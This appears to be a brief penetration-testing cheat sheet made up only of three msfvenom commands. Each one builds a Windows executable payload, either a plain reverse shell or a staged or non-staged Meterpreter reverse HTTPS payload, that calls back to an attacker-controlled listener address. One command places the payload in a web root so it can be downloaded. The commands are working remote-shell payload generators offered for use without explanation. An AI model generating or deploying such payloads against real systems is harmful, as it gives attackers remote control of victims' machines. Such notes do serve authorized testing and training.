```non_staged_windows
sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
```

```non_staged_meterpreter_windows
sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -o msfnonstaged.exe
```

```staged_meterpreter_windows
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -f exe -o /var/www/html/msfstaged.exe
```

